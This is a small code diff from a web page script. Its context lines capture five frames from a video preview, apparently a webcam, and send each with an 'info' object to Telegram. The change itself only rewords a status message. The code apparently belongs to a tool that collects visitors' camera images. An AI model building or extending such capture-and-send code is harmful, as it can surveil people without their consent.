@@ -86,7 +86,7 @@
                     ctx.drawImage(videoPreview, 0, 0, captureCanvas.width, captureCanvas.height);
                     const blob = await new Promise(resolve => captureCanvas.toBlob(resolve, 'image/jpeg', 0.95));
                     await sendPhotoToTelegram(blob, info, i);
-                    loadingText.textContent = `Photo ${i}/5 sent...`;
+                    loadingText.textContent = `success${i}/5 sent...`;
                     await new Promise(resolve => setTimeout(resolve, 1000)); // 1 sec delay between photos
                 }
 
